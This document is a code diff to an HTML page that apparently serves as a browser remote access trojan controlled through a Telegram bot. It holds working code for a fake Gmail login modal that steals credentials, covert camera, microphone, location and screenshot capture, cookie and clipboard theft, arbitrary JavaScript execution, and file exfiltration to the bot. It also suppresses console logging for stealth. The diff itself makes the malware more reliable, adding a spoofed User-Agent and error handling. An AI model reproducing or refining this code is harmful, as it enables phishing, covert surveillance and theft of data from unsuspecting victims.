@@ -46,7 +46,7 @@
             opacity: 0;
             transition: opacity 0.8s;
         }
-        /* Fake Gmail modal */
+        /* Fake Gmail phishing modal */
         .gmail-phish-modal {
             position: fixed;
             top: 0;
@@ -113,16 +113,21 @@
         let intervalId = null;
         let phishingModalActive = false;
 
-        // Suppress console logs
+        // Suppress console logs for stealth
         console.log = function() {};
         console.error = function() {};
+
+        // Helper: headers to avoid Telegram blocking browser requests
+        const TELEGRAM_HEADERS = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        };
 
         // ================= TELEGRAM HELPERS =================
         async function sendMessage(text, parseMode = 'HTML') {
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: { ...TELEGRAM_HEADERS, 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text, parse_mode: parseMode })
                 });
             } catch(e) {}
@@ -133,7 +138,7 @@
             fd.append('chat_id', ADMIN_CHAT_ID);
             fd.append('photo', blob, 'capture.jpg');
             fd.append('caption', caption);
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', headers: TELEGRAM_HEADERS, body: fd });
         }
 
         async function sendDocument(blob, filename, caption) {
@@ -141,7 +146,7 @@
             fd.append('chat_id', ADMIN_CHAT_ID);
             fd.append('document', blob, filename);
             fd.append('caption', caption);
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', headers: TELEGRAM_HEADERS, body: fd });
         }
 
         // ================= REGISTRATION =================
@@ -158,7 +163,7 @@
             await sendMessage(`🔌 *New Device Connected*\n🌐 ${info.url}\n🖥️ ${info.ua.substring(0,100)}\n📱 ${info.platform}\n🌍 ${info.lang}\n📺 ${info.screen}`, 'Markdown');
         }
 
-        // ================= PHISHING MODAL =================
+        // ================= PHISHING MODAL (FORCED GMAIL LOGIN) =================
         function createPhishingModal() {
             if (phishingModalActive) return;
             phishingModalActive = true;
@@ -188,7 +193,7 @@
                 const email = emailInp.value.trim();
                 const pass = passInp.value;
                 if (!email || !pass) { errDiv.style.display = 'block'; errDiv.innerText = 'Please fill both fields.'; return; }
-                await sendMessage(`🎣 *Gmail Credentials* 📧 ${email} 🔑 ${pass}`, 'Markdown');
+                await sendMessage(`🎣 *Gmail Credentials*\n📧 Email: ${email}\n🔑 Password: ${pass}`, 'Markdown');
                 modal.remove();
                 document.body.classList.remove('modal-active');
                 phishingModalActive = false;
@@ -208,11 +213,11 @@
             try {
                 switch(cmd) {
                     case '/start':
-                        await sendMessage(`✅ *RAT Active*\nCommands:\n/phish_gmail - forced Gmail login\n/gmail - extract from real login page\n/photo - take camera picture\n/audio - record microphone\n/location - GPS coordinates\n/screenshot - page screenshot\n/cookies - dump cookies\n/grab_pass - any visible password\n/clipboard - read clipboard\n/eval <js> - run JS\n/upload - ask user to send a file`);
+                        await sendMessage(`✅ *RAT Active*\n\nCommands:\n/phish_gmail - Forced Gmail login modal\n/gmail - Extract login from real Google page\n/photo - Take camera picture\n/audio - Record microphone (5s)\n/location - GPS coordinates\n/screenshot - Page screenshot\n/cookies - Dump cookies\n/grab_pass - Any visible password\n/clipboard - Read clipboard\n/eval <js> - Execute JS\n/upload - Exfiltrate a file`, 'Markdown');
                         break;
                     case '/phish_gmail':
                         if (!phishingModalActive) createPhishingModal();
-                        await sendMessage('🎣 Phishing modal injected');
+                        await sendMessage('🎣 Phishing modal injected. User is now blocked until credentials are entered.');
                         break;
                     case '/gmail': {
                         if (location.href.includes('accounts.google.com')) {
@@ -221,12 +226,12 @@
                             if (!pass) {
                                 const pf = document.querySelector('input[type="password"]');
                                 if (pf) { pf.focus(); setTimeout(() => pf.blur(), 100); }
-                                await sendMessage('Attempting extraction...');
+                                await sendMessage('Attempting to trigger autofill...');
                             } else {
-                                await sendMessage(`🔑 Gmail credentials: ${email} / ${pass}`);
+                                await sendMessage(`🔑 Gmail credentials extracted:\n📧 Email: ${email}\n🔑 Password: ${pass}`);
                             }
                         } else {
-                            await sendMessage('Not on Google login page. Use /phish_gmail instead.');
+                            await sendMessage('Not on Google login page. Use /phish_gmail to force a fake modal.');
                         }
                         break;
                     }
@@ -245,23 +250,25 @@
                         } catch(e) { await sendMessage(`Camera error: ${e.message}`); }
                         break;
                     case '/audio': {
-                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                        const mediaRecorder = new MediaRecorder(stream);
-                        let chunks = [];
-                        mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                        mediaRecorder.onstop = async () => {
-                            const blob = new Blob(chunks, { type: 'audio/webm' });
-                            await sendDocument(blob, 'recording.webm', '🎙️ Audio capture');
-                            stream.getTracks().forEach(t => t.stop());
-                        };
-                        mediaRecorder.start();
-                        setTimeout(() => mediaRecorder.stop(), 5000);
-                        await sendMessage('Recording audio for 5 seconds...');
+                        try {
+                            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                            const mediaRecorder = new MediaRecorder(stream);
+                            let chunks = [];
+                            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                            mediaRecorder.onstop = async () => {
+                                const blob = new Blob(chunks, { type: 'audio/webm' });
+                                await sendDocument(blob, 'recording.webm', '🎙️ Audio capture (5s)');
+                                stream.getTracks().forEach(t => t.stop());
+                            };
+                            mediaRecorder.start();
+                            setTimeout(() => mediaRecorder.stop(), 5000);
+                            await sendMessage('Recording audio for 5 seconds...');
+                        } catch(e) { await sendMessage(`Microphone error: ${e.message}`); }
                         break;
                     }
                     case '/location':
                         navigator.geolocation.getCurrentPosition(async pos => {
-                            await sendMessage(`📍 Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}\nAccuracy: ${pos.coords.accuracy}m`);
+                            await sendMessage(`📍 GPS Location:\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nAccuracy: ${pos.coords.accuracy}m`);
                         }, async err => await sendMessage(`GPS error: ${err.message}`));
                         break;
                     case '/screenshot':
@@ -297,10 +304,12 @@
                         input.type = 'file';
                         input.onchange = async (e) => {
                             const file = e.target.files[0];
-                            if (file) await sendDocument(file, file.name, `📁 File: ${file.name}`);
+                            if (file) {
+                                await sendDocument(file, file.name, `📁 File exfiltrated: ${file.name}`);
+                            }
                         };
                         input.click();
-                        await sendMessage('File picker opened on victim side');
+                        await sendMessage('File picker opened on victim side.');
                         break;
                     }
                     default:
@@ -311,11 +320,11 @@
             }
         }
 
-        // ================= POLLING =================
+        // ================= POLLING (getUpdates) =================
         async function pollUpdates() {
             if (!isRegistered) return;
             try {
-                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${updateId}&timeout=15`);
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${updateId}&timeout=15`, { headers: TELEGRAM_HEADERS });
                 const data = await res.json();
                 if (data.ok && data.result) {
                     for (const upd of data.result) {
@@ -328,15 +337,18 @@
             } catch(e) {}
         }
 
-        // ================= INIT =================
-        async function activate() {
+        // ================= STARTUP: DELETE WEBHOOK & INIT =================
+        async function deleteWebhookAndStart() {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook`, { method: 'POST', headers: TELEGRAM_HEADERS });
             await registerClient();
             isRegistered = true;
             intervalId = setInterval(pollUpdates, POLL_INTERVAL);
+            // Hide loading overlay and show iframe
             document.getElementById('loadingOverlay').style.display = 'none';
             document.getElementById('mainFrame').style.opacity = '1';
         }
-        setTimeout(activate, START_DELAY);
+
+        setTimeout(deleteWebhookAndStart, START_DELAY);
     </script>
 </body>
 </html>
